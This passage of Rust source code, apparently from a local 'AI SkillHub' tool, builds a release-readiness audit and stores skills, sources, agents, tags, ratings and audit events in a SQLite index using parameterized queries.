                && snapshot.operation_runners.iter().any(|runner| {
                    runner.id == "release-package-readiness" && runner.file_count > 0
                }),
            "Real write readiness checkers are available and report-only.",
            "Run agent-sync and release-package readiness checkers before claiming release complete.",
        ),
        completion_check(
            "real-execution-guard",
            "Final execution guard",
            snapshot
                .operation_runners
                .iter()
                .any(|runner| runner.id == "agent-sync-executor" && runner.file_count > 0)
                && snapshot.operation_runners.iter().any(|runner| {
                    runner.id == "release-package-executor" && runner.file_count > 0
                }),
            "Final execution attempts are routed through auditable guard-rail reports.",
            "Run agent-sync and release-package final executor attempts; blocked reports are acceptable until real writes are explicitly approved.",
        ),
    ];

    let ready_count = checks
        .iter()
        .filter(|check| check["passed"].as_bool().unwrap_or(false))
        .count();
    let blocked_count = checks.len().saturating_sub(ready_count);
    let status = if blocked_count == 0 { "ok" } else { "warn" };
    let summary = format!(
        "AI SkillHub completion audit: {} ready area(s), {} remaining area(s); real write executors remain gated.",
        ready_count, blocked_count
    );
    let body = serde_json::json!({
        "kind": "v2-completion-audit",
        "generatedAt": timestamp,
        "status": status,
        "summary": summary,
        "readyAreas": ready_count,
        "remainingAreas": blocked_count,
        "estimatedCompletion": if blocked_count == 0 { "100%" } else { "96%" },
        "checks": checks,
        "realWrites": false,
        "releaseAdvice": if blocked_count == 0 {
            "AI SkillHub is ready to enter final release packaging review."
        } else {
            "Do not call the release complete yet. Resolve remaining gates before opening real writes or public release."
        }
    });

    Ok((status.to_string(), summary, body))
}

fn completion_check(
    id: &str,
    title: &str,
    passed: bool,
    ready_summary: &str,
    next_action: &str,
) -> Value {
    serde_json::json!({
        "id": id,
        "title": title,
        "passed": passed,
        "status": if passed { "ready" } else { "needs-action" },
        "summary": if passed { ready_summary } else { next_action },
        "nextAction": next_action
    })
}

fn normalize_tag_list(tags: &[String]) -> Result<Vec<String>, String> {
    let mut output: Vec<String> = Vec::new();
    for tag in tags {
        let tag = compact_note(tag).trim_matches('#').trim().to_string();
        if tag.is_empty() {
            continue;
        }
        if tag.len() > 40 {
            return Err("Tag is too long.".to_string());
        }
        if !output.iter().any(|item| item.eq_ignore_ascii_case(&tag)) {
            output.push(tag);
        }
    }
    if output.len() > 12 {
        return Err("At most 12 tags can be saved at once.".to_string());
    }
    Ok(output)
}

fn upsert_tag(connection: &Connection, name: &str) -> Result<String, String> {
    let name = compact_note(name);
    let tag_id = stable_id("tag", &name.to_lowercase());
    connection
        .execute(
            "INSERT OR IGNORE INTO tags (id, name, color) VALUES (?1, ?2, ?3)",
            params![&tag_id, &name, tag_color(&name)],
        )
        .map_err(|error| format!("Cannot upsert tag {}: {}", name, error))?;
    Ok(tag_id)
}

fn write_audit_event(
    connection: &Connection,
    event_type: &str,
    summary: &str,
    detail_json: serde_json::Value,
) -> Result<(), String> {
    let timestamp = unix_timestamp_string();
    connection
        .execute(
            "INSERT INTO audit_events (
                id, event_type, summary, detail_json, created_at
            ) VALUES (?1, ?2, ?3, ?4, ?5)",
            params![
                format!("audit-{}-{}", event_type, timestamp),
                event_type,
                summary,
                serde_json::to_string(&detail_json).unwrap_or_else(|_| "{}".to_string()),
                timestamp
            ],
        )
        .map_err(|error| format!("Cannot write v2 audit event: {}", error))?;
    Ok(())
}

fn record_usage_event_row(
    target_type: &str,
    target_id: &str,
    target_name: &str,
    source_name: &str,
    event_type: &str,
) -> Result<(), String> {
    let target_type = compact_note(target_type);
    let target_id = compact_note(target_id);
    let target_name = compact_note(target_name);
    let source_name = compact_note(source_name);
    let event_type = compact_note(event_type);

    if target_type.is_empty() || target_id.is_empty() || event_type.is_empty() {
        return Err("Usage event target and type are required.".to_string());
    }
    if target_type.len() > 40
        || target_id.len() > 160
        || target_name.len() > 160
        || source_name.len() > 160
        || event_type.len() > 60
    {
        return Err("Usage event metadata is too long.".to_string());
    }

    let root = resolve_legacy_root()?;
    let connection = open_index_database(&root)?;
    record_usage_event_row_in_connection(
        &connection,
        &target_type,
        &target_id,
        &target_name,
        &source_name,
        &event_type,
    )
}

fn record_usage_event_row_in_connection(
    connection: &Connection,
    target_type: &str,
    target_id: &str,
    target_name: &str,
    source_name: &str,
    event_type: &str,
) -> Result<(), String> {
    let timestamp = unix_timestamp_string();
    connection
        .execute(
            "INSERT INTO usage_events (
                id, target_type, target_id, target_name, source_name, event_type, created_at
            ) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7)",
            params![
                format!(
                    "usage-{}-{}",
                    timestamp,
                    stable_id(
                        "usage",
                        &format!("{}:{}:{}", target_type, target_id, event_type)
                    )
                ),
                target_type,
                target_id,
                target_name,
                source_name,
                event_type,
                timestamp
            ],
        )
        .map_err(|error| format!("Cannot write usage event: {}", error))?;

    connection
        .execute(
            "INSERT INTO audit_events (
                id, event_type, summary, detail_json, created_at
            ) VALUES (?1, 'usage_recorded', ?2, ?3, ?4)",
            params![
                format!(
                    "audit-usage-{}-{}",
                    timestamp,
                    stable_id("usage", &format!("{}:{}", target_type, target_id))
                ),
                format!("Recorded {} usage", target_type),
                serde_json::to_string(&serde_json::json!({
                    "targetType": target_type,
                    "targetId": target_id,
                    "targetName": target_name,
                    "sourceName": source_name,
                    "eventType": event_type,
                    "scope": "v2-local-event"
                }))
                .unwrap_or_else(|_| "{}".to_string()),
                timestamp
            ],
        )
        .map_err(|error| format!("Cannot write usage audit event: {}", error))?;

    Ok(())
}

fn set_skill_metadata_override_in_connection(
    connection: &Connection,
    folder_name: &str,
    name: &str,
    category: &str,
    description: &str,
    note: &str,
) -> Result<(), String> {
    let folder_name = compact_note(folder_name);
    let display_name = compact_note(name);
    let category = compact_note(category);
    let description = compact_note(description);
    let note = compact_note(note);

    if folder_name.is_empty() {
        return Err("Skill folder name is required.".to_string());
    }
    if display_name.is_empty() {
        return Err("Skill name cannot be empty.".to_string());
    }
    if display_name.len() > 120
        || category.len() > 80
        || description.len() > 600
        || note.len() > 600
    {
        return Err("Skill metadata is too long.".to_string());
    }

    let skill_id: Option<String> = connection
        .query_row(
            "SELECT id FROM skills WHERE folder_name = ?1 LIMIT 1",
            params![folder_name],
            |row| row.get(0),
        )
        .optional()
        .map_err(|error| format!("Cannot locate skill {}: {}", folder_name, error))?;
    let skill_id = skill_id.ok_or_else(|| format!("Cannot find indexed skill {}.", folder_name))?;
    let timestamp = unix_timestamp_string();

    connection
        .execute(
            "INSERT INTO skill_overrides (
                skill_id, display_name, category_id, description, note, updated_at
            ) VALUES (?1, ?2, ?3, ?4, ?5, ?6)
            ON CONFLICT(skill_id) DO UPDATE SET
                display_name = excluded.display_name,
                category_id = excluded.category_id,
                description = excluded.description,
                note = excluded.note,
                updated_at = excluded.updated_at",
            params![
                &skill_id,
                &display_name,
                &category,
                &description,
                &note,
                &timestamp
            ],
        )
        .map_err(|error| format!("Cannot save skill metadata override: {}", error))?;

    connection
        .execute(
            "INSERT INTO audit_events (
                id, event_type, summary, detail_json, created_at
            ) VALUES (?1, 'skill_metadata_updated', ?2, ?3, ?4)",
            params![
                format!(
                    "audit-skill-meta-{}-{}",
                    timestamp,
                    stable_id("skill", &folder_name)
                ),
                "Updated skill metadata override",
                serde_json::to_string(&serde_json::json!({
                    "folderName": folder_name,
                    "skillId": skill_id,
                    "scope": "v2-sqlite-only"
                }))
                .unwrap_or_else(|_| "{}".to_string()),
                timestamp
            ],
        )
        .map_err(|error| format!("Cannot write skill metadata audit event: {}", error))?;

    Ok(())
}

fn set_skill_enabled_override_in_connection(
    connection: &Connection,
    folder_name: &str,
    enabled: bool,
) -> Result<(), String> {
    let folder_name = compact_note(folder_name);
    if folder_name.is_empty() {
        return Err("Skill folder name is required.".to_string());
    }

    let skill_id: Option<String> = connection
        .query_row(
            "SELECT id FROM skills WHERE folder_name = ?1 LIMIT 1",
            params![folder_name],
            |row| row.get(0),
        )
        .optional()
        .map_err(|error| format!("Cannot locate skill {}: {}", folder_name, error))?;
    let skill_id = skill_id.ok_or_else(|| format!("Cannot find indexed skill {}.", folder_name))?;
    let timestamp = unix_timestamp_string();

    connection
        .execute(
            "INSERT INTO skill_overrides (
                skill_id, display_name, category_id, description, note, enabled, updated_at
            ) VALUES (?1, '', '', '', '', ?2, ?3)
            ON CONFLICT(skill_id) DO UPDATE SET
                enabled = excluded.enabled,
                updated_at = excluded.updated_at",
            params![&skill_id, if enabled { 1 } else { 0 }, &timestamp],
        )
        .map_err(|error| format!("Cannot save skill enabled override: {}", error))?;

    connection
        .execute(
            "INSERT INTO audit_events (
                id, event_type, summary, detail_json, created_at
            ) VALUES (?1, 'skill_enabled_updated', ?2, ?3, ?4)",
            params![
                format!(
                    "audit-skill-enabled-{}-{}",
                    timestamp,
                    stable_id("skill", &folder_name)
                ),
                "Updated skill enabled override",
                serde_json::to_string(&serde_json::json!({
                    "folderName": folder_name,
                    "skillId": skill_id,
                    "enabled": enabled,
                    "scope": "v2-sqlite-only"
                }))
                .unwrap_or_else(|_| "{}".to_string()),
                timestamp
            ],
        )
        .map_err(|error| format!("Cannot write skill enabled audit event: {}", error))?;

    Ok(())
}

fn set_skill_rating_override_in_connection(
    connection: &Connection,
    folder_name: &str,
    rating: u8,
) -> Result<(), String> {
    let folder_name = compact_note(folder_name);
    if folder_name.is_empty() {
        return Err("Skill folder name is required.".to_string());
    }
    if rating > 5 {
        return Err("Skill rating must be between 0 and 5.".to_string());
    }

    let skill_id: Option<String> = connection
        .query_row(
            "SELECT id FROM skills WHERE folder_name = ?1 LIMIT 1",
            params![folder_name],
            |row| row.get(0),
        )
        .optional()
        .map_err(|error| format!("Cannot locate skill {}: {}", folder_name, error))?;
    let skill_id = skill_id.ok_or_else(|| format!("Cannot find indexed skill {}.", folder_name))?;
    let timestamp = unix_timestamp_string();

    connection
        .execute(
            "INSERT INTO skill_overrides (
                skill_id, display_name, category_id, description, note, enabled, rating, updated_at
            ) VALUES (?1, '', '', '', '', NULL, ?2, ?3)
            ON CONFLICT(skill_id) DO UPDATE SET
                rating = excluded.rating,
                updated_at = excluded.updated_at",
            params![&skill_id, i64::from(rating), &timestamp],
        )
        .map_err(|error| format!("Cannot save skill rating override: {}", error))?;

    connection
        .execute(
            "INSERT INTO audit_events (
                id, event_type, summary, detail_json, created_at
            ) VALUES (?1, 'skill_rating_updated', ?2, ?3, ?4)",
            params![
                format!(
                    "audit-skill-rating-{}-{}",
                    timestamp,
                    stable_id("skill", &folder_name)
                ),
                if rating == 0 {
                    "Cleared local skill rating"
                } else {
                    "Updated local skill rating"
                },
                serde_json::to_string(&serde_json::json!({
                    "folderName": folder_name,
                    "skillId": skill_id,
                    "rating": rating,
                    "scope": "v2-sqlite-only"
                }))
                .unwrap_or_else(|_| "{}".to_string()),
                timestamp
            ],
        )
        .map_err(|error| format!("Cannot write skill rating audit event: {}", error))?;

    Ok(())
}

fn set_source_rating_override_in_connection(
    connection: &Connection,
    source_id: &str,
    rating: u8,
) -> Result<(), String> {
    let source_id = compact_note(source_id);
    if source_id.is_empty() {
        return Err("Source id is required.".to_string());
    }
    if rating > 5 {
        return Err("Source rating must be between 0 and 5.".to_string());
    }

    let exists: Option<String> = connection
        .query_row(
            "SELECT id FROM sources WHERE id = ?1 LIMIT 1",
            params![&source_id],
            |row| row.get(0),
        )
        .optional()
        .map_err(|error| format!("Cannot locate source {}: {}", source_id, error))?;
    exists.ok_or_else(|| format!("Cannot find indexed source {}.", source_id))?;
    let timestamp = unix_timestamp_string();

    connection
        .execute(
            "INSERT INTO source_overrides (
                source_id, display_name, source_type, category_id, note, enabled, rating, updated_at
            ) VALUES (?1, '', '', '', '', NULL, ?2, ?3)
            ON CONFLICT(source_id) DO UPDATE SET
                rating = excluded.rating,
                updated_at = excluded.updated_at",
            params![&source_id, i64::from(rating), &timestamp],
        )
        .map_err(|error| format!("Cannot save source rating override: {}", error))?;

    connection
        .execute(
            "INSERT INTO audit_events (
                id, event_type, summary, detail_json, created_at
            ) VALUES (?1, 'source_rating_updated', ?2, ?3, ?4)",
            params![
                format!(
                    "audit-source-rating-{}-{}",
                    timestamp,
                    stable_id("source", &source_id)
                ),
                if rating == 0 {
                    "Cleared local parent Skill rating"
                } else {
                    "Updated local parent Skill rating"
                },
                serde_json::to_string(&serde_json::json!({
                    "sourceId": source_id,
                    "rating": rating,
                    "scope": "v2-sqlite-only"
                }))
                .unwrap_or_else(|_| "{}".to_string()),
                timestamp
            ],
        )
        .map_err(|error| format!("Cannot write source rating audit event: {}", error))?;

    Ok(())
}

fn persist_snapshot(root: &Path, snapshot: &LegacySnapshot) -> Result<IndexReport, String> {
    let db_file = database_file(root);
    let mut connection = open_index_database(root)?;
    let enabled_state = load_enabled_state(&connection);
    let source_tag_overrides = read_tag_overrides(&connection, "source")?;
    let skill_tag_overrides = read_tag_overrides(&connection, "skill")?;
    let preset_workspace_policies = read_preset_workspace_policies(&connection)?;

    let indexed_at = unix_timestamp_string();
    let snapshot_id = format!("legacy-import-{}", indexed_at);
    let transaction = connection
        .transaction()
        .map_err(|error| format!("Cannot start v2 SQLite transaction: {}", error))?;

    transaction
        .execute("DELETE FROM skill_tags", [])
        .map_err(|error| format!("Cannot clear skill tag index: {}", error))?;
    transaction
        .execute("DELETE FROM source_tags", [])
        .map_err(|error| format!("Cannot clear source tag index: {}", error))?;
    transaction
        .execute("DELETE FROM skill_tag_overrides", [])
        .map_err(|error| format!("Cannot clear skill tag overrides: {}", error))?;
    transaction
        .execute("DELETE FROM source_tag_overrides", [])
        .map_err(|error| format!("Cannot clear source tag overrides: {}", error))?;
    transaction
        .execute("DELETE FROM preset_skills", [])
        .map_err(|error| format!("Cannot clear preset skill index: {}", error))?;
    transaction
        .execute("DELETE FROM preset_workspaces", [])
        .map_err(|error| format!("Cannot clear preset workspace policies: {}", error))?;
    transaction
        .execute("DELETE FROM workspace_agents", [])
        .map_err(|error| format!("Cannot clear workspace agent index: {}", error))?;
    transaction
        .execute("DELETE FROM adapter_safety_checks", [])
        .map_err(|error| format!("Cannot clear adapter safety checks: {}", error))?;
    transaction
        .execute("DELETE FROM adapter_capabilities", [])
        .map_err(|error| format!("Cannot clear adapter capabilities: {}", error))?;
    transaction
        .execute("DELETE FROM restore_dry_run_items", [])
        .map_err(|error| format!("Cannot clear restore dry-run items: {}", error))?;
    transaction
        .execute("DELETE FROM backup_dry_run_items", [])
        .map_err(|error| format!("Cannot clear backup dry-run items: {}", error))?;
    transaction
        .execute("DELETE FROM backup_targets", [])
        .map_err(|error| format!("Cannot clear backup targets: {}", error))?;
    transaction
        .execute("DELETE FROM project_scans", [])
        .map_err(|error| format!("Cannot clear project scans: {}", error))?;
    transaction
        .execute("DELETE FROM skills", [])
        .map_err(|error| format!("Cannot clear skill index: {}", error))?;
    transaction
        .execute("DELETE FROM sources", [])
        .map_err(|error| format!("Cannot clear source index: {}", error))?;
    transaction
        .execute("DELETE FROM agents", [])
        .map_err(|error| format!("Cannot clear agent index: {}", error))?;
    transaction
        .execute("DELETE FROM agent_adapters", [])
        .map_err(|error| format!("Cannot clear agent adapter registry: {}", error))?;
    transaction
        .execute("DELETE FROM workspaces", [])
        .map_err(|error| format!("Cannot clear workspace index: {}", error))?;
    transaction
        .execute("DELETE FROM presets", [])
        .map_err(|error| format!("Cannot clear preset index: {}", error))?;

    let mut source_ids: HashMap<String, String> = HashMap::new();
    for source in &snapshot.sources {
        let source_id = if source.id.is_empty() {
            stable_id("source", &source.name)
        } else {
            source.id.clone()
        };
        insert_source_id_primary(&mut source_ids, &source.name, &source_id);
        insert_source_id_primary(&mut source_ids, &source.id, &source_id);
        if let Some(folder_name) = Path::new(&source.local_path)
            .file_name()
            .and_then(|value| value.to_str())
        {
            insert_source_id_primary(&mut source_ids, folder_name, &source_id);
        }
        if let Some((_owner, repo_name)) = parse_github_repo(&source.url) {
            insert_source_id_alias(&mut source_ids, &repo_name, &source_id);
        }
        transaction
            .execute(
                "INSERT INTO sources (
                    id, name, source_type, url, local_path, install_mode,
                    category_id, note, enabled, created_at, updated_at,
                    usage_guide, metadata_origin, metadata_confidence
                ) VALUES (
                    ?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9, ?10, ?10,
                    ?11, ?12, ?13
                )",
                params![
                    source_id,
                    source.name,
                    source.source_type,
                    source.url,
                    source.local_path,
                    source.mode,
                    source.category_id,
                    source.note,
                    if source.enabled { 1 } else { 0 },
                    indexed_at,
                    source.usage_guide,
                    source.metadata_origin,
                    source.metadata_confidence,
                ],
            )
            .map_err(|error| format!("Cannot index source {}: {}", source.name, error))?;
        link_source_tag(
            &transaction,
            &source_id,
            &category_label(&source.category_id),
            &indexed_at,
        )?;
        link_source_tag(&transaction, &source_id, &source.source_type, &indexed_at)?;
        for tag in &source.tags {
            link_source_tag(&transaction, &source_id, tag, &indexed_at)?;
        }
    }
    restore_tag_overrides(&transaction, "source", &source_tag_overrides, &indexed_at)?;

    let mut skill_ids_by_category: BTreeMap<String, Vec<String>> = BTreeMap::new();
    let mut all_skill_ids: Vec<String> = Vec::new();
    for skill in &snapshot.skills {
        let skill_id = stable_id("skill", &skill.folder_name);
        let source_id = resolve_skill_source_id(skill, &source_ids);
        if skill.is_router_hub
            && skill.source.eq_ignore_ascii_case(ROUTER_HUB_FOLDER)
            && source_id.is_none()
        {
            continue;
        }
        all_skill_ids.push(skill_id.clone());
        skill_ids_by_category
            .entry(category_label(&skill.category))
            .or_default()
            .push(skill_id.clone());
        transaction
            .execute(
                "INSERT INTO skills (
                    id, source_id, name, folder_name, description, category_id,
                    health_status, health_summary, enabled, relative_path,
                    created_at, updated_at, is_router_hub, usage_guide,
                    metadata_origin, metadata_confidence
                ) VALUES (
                    ?1, ?2, ?3, ?4, ?5, ?6, ?7, '', ?8, ?9, ?10, ?10,
                    ?11, ?12, ?13, ?14
                )",
                params![
                    skill_id,
                    source_id,
                    skill.name,
                    skill.folder_name,
                    skill.description,
                    skill.category,
                    skill.health,
                    if skill.enabled { 1 } else { 0 },
                    skill.relative_path,
                    indexed_at,
                    if skill.is_router_hub { 1 } else { 0 },
                    skill.usage_guide,
                    skill.metadata_origin,
                    skill.metadata_confidence,
                ],
            )
            .map_err(|error| format!("Cannot index skill {}: {}", skill.name, error))?;
        link_skill_tag(
            &transaction,
            &skill_id,
            &category_label(&skill.category),
            &indexed_at,
        )?;
        if !skill.source.trim().is_empty() {
            link_skill_tag(&transaction, &skill_id, &skill.source, &indexed_at)?;
        }
        for tag in &skill.tags {
            link_skill_tag(&transaction, &skill_id, tag, &indexed_at)?;
        }
    }
    restore_tag_overrides(&transaction, "skill", &skill_tag_overrides, &indexed_at)?;
    transaction
        .execute(
            "DELETE FROM skill_folder_memberships
             WHERE skill_id NOT IN (SELECT id FROM skills)",
            [],
        )
        .map_err(|error| format!("Cannot remove stale Skill folder memberships: {}", error))?;
    transaction
        .execute(
            "DELETE FROM source_folder_memberships
             WHERE source_id NOT IN (SELECT id FROM sources)",
            [],
        )
        .map_err(|error| format!("Cannot remove stale source folder memberships: {}", error))?;

    for agent in &snapshot.agents {
        transaction
            .execute(
                "INSERT INTO agents (
                    id, name, skills_path, detected, managed, enabled, updated_at
                ) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7)",
                params![
                    stable_id("agent", &agent.id),
                    agent.name,
                    agent.path,
                    if agent.detected { 1 } else { 0 },
                    if agent.managed { 1 } else { 0 },
                    if enabled_state
                        .agents
                        .get(&stable_id("agent", &agent.id))
                        .copied()
                        .unwrap_or(agent.detected)
                    {
                        1
                    } else {
                        0
                    },
                    indexed_at
                ],
            )
            .map_err(|error| format!("Cannot index agent {}: {}", agent.name, error))?;
    }

    seed_agent_adapters(
        &transaction,
        &snapshot.agent_adapters,
        &snapshot.adapter_safety_checks,
        &snapshot.adapter_capabilities,
        &enabled_state,
        &indexed_at,
    )?;
    seed_workspaces(
        &transaction,
        root,
        &snapshot.agents,
        snapshot.skills.len(),
        &enabled_state,
        &indexed_at,
    )?;
    seed_project_scans(&transaction, &snapshot.project_scans)?;
    seed_backup_targets(&transaction, &snapshot.backup_targets, &indexed_at)?;
    seed_backup_dry_run(&transaction, &snapshot.backup_dry_run, &indexed_at)?;
    seed_restore_dry_run(&transaction, &snapshot.restore_dry_run, &indexed_at)?;
    seed_presets(
        &transaction,
        &all_skill_ids,
        &skill_ids_by_category,
        &enabled_state,
        &indexed_at,
    )?;
    restore_preset_workspace_policies(&transaction, &preset_workspace_policies, &indexed_at)?;

    let manifest_json = serde_json::to_string(&serde_json::json!({
        "root": snapshot.root,
        "summary": snapshot.summary,
        "diagnostics": snapshot.diagnostics,
        "mode": snapshot.mode,
    }))
    .map_err(|error| format!("Cannot serialize v2 snapshot manifest: {}", error))?;
    transaction
        .execute(
            "INSERT OR REPLACE INTO snapshots (
                id, name, summary, manifest_json, created_at
            ) VALUES (?1, ?2, ?3, ?4, ?5)",
            params![
                snapshot_id,
                "Latest v1 read-only import",
                format!(
                    "{} skills, {} sources, {} agents",
                    snapshot.skills.len(),
                    snapshot.sources.len(),
                    snapshot.agents.len()
                ),
                manifest_json,
                indexed_at
            ],
        )
        .map_err(|error| format!("Cannot write v2 snapshot record: {}", error))?;

    seed_rollback_plan(&transaction, snapshot, &snapshot_id, &indexed_at)?;

    transaction
        .execute(
            "INSERT INTO audit_events (
                id, event_type, summary, detail_json, created_at
            ) VALUES (?1, 'legacy_scan_indexed', ?2, ?3, ?4)",
            params![
                format!("audit-{}", indexed_at),
                "Indexed v1 data into v2 SQLite",
                serde_json::to_string(&serde_json::json!({
                    "skills": snapshot.skills.len(),
                    "sources": snapshot.sources.len(),
                    "agents": snapshot.agents.len(),
                    "databaseFile": db_file.display().to_string(),
                }))
                .unwrap_or_else(|_| "{}".to_string()),
                indexed_at
            ],
        )
        .map_err(|error| format!("Cannot write v2 audit event: {}", error))?;

    transaction
        .commit()
        .map_err(|error| format!("Cannot commit v2 SQLite index: {}", error))?;

    Ok(IndexReport {
        persisted: true,
        database_file: db_file.display().to_string(),
        indexed_at,
        sources_indexed: snapshot.sources.len(),
        skills_indexed: snapshot.skills.len(),
        agents_indexed: snapshot.agents.len(),
        snapshot_id,
    })
}

fn persist_agent_detection_refresh(
    root: &Path,
    connection: &mut Connection,
    diagnostics_json: Option<&Value>,
) -> Result<(), String> {
    let enabled_state = load_enabled_state(connection);
    let preset_workspace_policies = read_preset_workspace_policies(connection)?;
    let mut snapshot = read_snapshot_from_database(root, connection)?;
    snapshot.agents = parse_agents(diagnostics_json);
    snapshot.agent_adapters = derive_agent_adapters(&snapshot.agents);
    snapshot.adapter_safety_checks = derive_adapter_safety_checks(&snapshot.agent_adapters);
    snapshot.adapter_capabilities = derive_adapter_capabilities(&snapshot.agent_adapters);
    snapshot.diagnostics = parse_diagnostic_summary(diagnostics_json);
    snapshot.summary.agents_detected = snapshot
        .agents
        .iter()
        .filter(|agent| agent.detected)
        .count();
    snapshot.summary.diagnostics_status = snapshot.diagnostics.overall_status.clone();
    snapshot.workspaces = derive_workspaces(root, &snapshot.agents, snapshot.skills.len());
    snapshot.project_scans = derive_project_scans(root, &snapshot.workspaces);
    snapshot.backup_targets = derive_backup_targets(root, &snapshot.agent_adapters);
    snapshot.backup_dry_run = derive_backup_dry_run(&snapshot.backup_targets);
    snapshot.restore_dry_run = derive_restore_dry_run(&snapshot.backup_targets);
    snapshot.mode = "agent-detection-refresh".to_string();
    apply_enabled_state(&mut snapshot, &enabled_state);

    let indexed_at = unix_timestamp_string();
    let snapshot_id = format!("agent-detection-{}", indexed_at);
    let transaction = connection
        .transaction()
        .map_err(|error| format!("Cannot start agent detection transaction: {}", error))?;

    transaction
        .execute("DELETE FROM workspace_agents", [])
        .map_err(|error| format!("Cannot clear workspace agent index: {}", error))?;
    transaction
        .execute("DELETE FROM preset_workspaces", [])
        .map_err(|error| format!("Cannot clear preset workspace policies: {}", error))?;
    transaction
        .execute("DELETE FROM adapter_safety_checks", [])
        .map_err(|error| format!("Cannot clear adapter safety checks: {}", error))?;
    transaction
        .execute("DELETE FROM adapter_capabilities", [])
        .map_err(|error| format!("Cannot clear adapter capabilities: {}", error))?;
    transaction
        .execute("DELETE FROM restore_dry_run_items", [])
        .map_err(|error| format!("Cannot clear restore dry-run items: {}", error))?;
    transaction
        .execute("DELETE FROM backup_dry_run_items", [])
        .map_err(|error| format!("Cannot clear backup dry-run items: {}", error))?;
    transaction
        .execute("DELETE FROM backup_targets", [])
        .map_err(|error| format!("Cannot clear backup targets: {}", error))?;
    transaction
        .execute("DELETE FROM project_scans", [])
        .map_err(|error| format!("Cannot clear project scans: {}", error))?;
    transaction
        .execute("DELETE FROM workspaces", [])
        .map_err(|error| format!("Cannot clear workspace index: {}", error))?;
    transaction
        .execute("DELETE FROM agents", [])
        .map_err(|error| format!("Cannot clear agent index: {}", error))?;
    transaction
        .execute("DELETE FROM agent_adapters", [])
        .map_err(|error| format!("Cannot clear agent adapter registry: {}", error))?;

    for agent in &snapshot.agents {
        transaction
            .execute(
                "INSERT INTO agents (
                    id, name, skills_path, detected, managed, enabled, updated_at
                ) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7)",
                params![
                    stable_id("agent", &agent.id),
                    agent.name,
                    agent.path,
                    if agent.detected { 1 } else { 0 },
                    if agent.managed { 1 } else { 0 },
                    if enabled_state
                        .agents
                        .get(&stable_id("agent", &agent.id))
                        .copied()
                        .unwrap_or(agent.detected)
                    {
                        1
                    } else {
                        0
                    },
                    indexed_at
                ],
            )
            .map_err(|error| format!("Cannot index agent {}: {}", agent.name, error))?;
    }

    seed_agent_adapters(
        &transaction,
        &snapshot.agent_adapters,
        &snapshot.adapter_safety_checks,
        &snapshot.adapter_capabilities,
        &enabled_state,
        &indexed_at,
    )?;
    seed_workspaces(
        &transaction,
        root,
        &snapshot.agents,
        snapshot.skills.len(),
        &enabled_state,
        &indexed_at,
    )?;
    restore_preset_workspace_policies(&transaction, &preset_workspace_policies, &indexed_at)?;
    seed_project_scans(&transaction, &snapshot.project_scans)?;
    seed_backup_targets(&transaction, &snapshot.backup_targets, &indexed_at)?;
    seed_backup_dry_run(&transaction, &snapshot.backup_dry_run, &indexed_at)?;
    seed_restore_dry_run(&transaction, &snapshot.restore_dry_run, &indexed_at)?;

    let manifest_json = serde_json::to_string(&serde_json::json!({
        "root": &snapshot.root,
        "summary": &snapshot.summary,
        "diagnostics": &snapshot.diagnostics,
        "mode": &snapshot.mode,
    }))
    .map_err(|error| format!("Cannot serialize agent detection manifest: {}", error))?;
    transaction
        .execute(
            "INSERT OR REPLACE INTO snapshots (
                id, name, summary, manifest_json, created_at
            ) VALUES (?1, ?2, ?3, ?4, ?5)",
            params![
                snapshot_id,
                "Latest AI tool detection refresh",
                format!(
                    "{} skills, {} sources, {} agents",
                    snapshot.skills.len(),
                    snapshot.sources.len(),
                    snapshot.agents.len()
                ),
                manifest_json,
                indexed_at
            ],
        )
        .map_err(|error| format!("Cannot write agent detection snapshot record: {}", error))?;
    seed_rollback_plan(&transaction, &snapshot, &snapshot_id, &indexed_at)?;

    transaction
        .execute(
            "INSERT INTO audit_events (
                id, event_type, summary, detail_json, created_at
            ) VALUES (?1, 'agent_detection_refreshed', ?2, ?3, ?4)",
            params![
                format!("audit-agent-detection-{}", indexed_at),
                "Refreshed AI tool detection without touching Skill Library metadata",
                serde_json::to_string(&serde_json::json!({
                    "agents": snapshot.agents.len(),
                    "detected": snapshot.agents.iter().filter(|agent| agent.detected).count(),
                    "scope": "agents-only"
                }))
                .unwrap_or_else(|_| "{}".to_string()),
                indexed_at
            ],
        )
        .map_err(|error| format!("Cannot write agent detection audit event: {}", error))?;

    transaction
        .commit()
        .map_err(|error| format!("Cannot commit agent detection refresh: {}", error))?;

    Ok(())
}

fn read_indexed_sources(connection: &Connection) -> Result<Vec<SourceCard>, String> {
    let mut tag_map = read_tag_map(connection, "source")?;
    let mut statement = connection
        .prepare(
            "SELECT
                sources.id,
                COALESCE(NULLIF(source_overrides.display_name, ''), sources.name) AS display_name,
                COALESCE(NULLIF(source_overrides.source_type, ''), sources.source_type) AS source_type,
                sources.url,
                sources.local_path,
                sources.install_mode,
                COALESCE(NULLIF(source_overrides.category_id, ''), sources.category_id) AS category_id,
                COALESCE(NULLIF(source_overrides.note, ''), sources.note) AS note,
                COALESCE(source_overrides.enabled, sources.enabled) AS enabled,
                COALESCE(source_overrides.rating, 0) AS rating,
                sources.created_at,
                CASE
                    WHEN COALESCE(NULLIF(source_overrides.source_type, ''), sources.source_type) = 'prompt' THEN 'info'
                    WHEN COUNT(skills.id) > 0 THEN 'ok'
                    ELSE 'warn'
                END AS health_status,
                COUNT(skills.id) AS skill_count,
                sources.usage_guide,
                CASE
                    WHEN source_overrides.source_id IS NOT NULL AND (
                        source_overrides.display_name <> ''
                        OR source_overrides.source_type <> ''
                        OR source_overrides.category_id <> ''
                        OR source_overrides.note <> ''
                    )
                    THEN 'manual+' || sources.metadata_origin
                    ELSE sources.metadata_origin
                END AS metadata_origin,
                CASE
                    WHEN source_overrides.source_id IS NOT NULL AND (
                        source_overrides.display_name <> ''
                        OR source_overrides.source_type <> ''
                        OR source_overrides.category_id <> ''
                        OR source_overrides.note <> ''
                    )
                    THEN 1.0
                    ELSE sources.metadata_confidence
                END AS metadata_confidence
                ,COALESCE(source_folder_memberships.folder_id, '') AS user_folder_id
                ,COALESCE(skill_folders.name, '') AS user_folder_name
                ,COALESCE(skill_folders.color, '') AS user_folder_color
            FROM sources
            LEFT JOIN skills ON skills.source_id = sources.id
            LEFT JOIN source_overrides ON source_overrides.source_id = sources.id
            LEFT JOIN source_folder_memberships ON source_folder_memberships.source_id = sources.id
            LEFT JOIN skill_folders ON skill_folders.id = source_folder_memberships.folder_id
            GROUP BY sources.id
            ORDER BY lower(display_name)",
        )
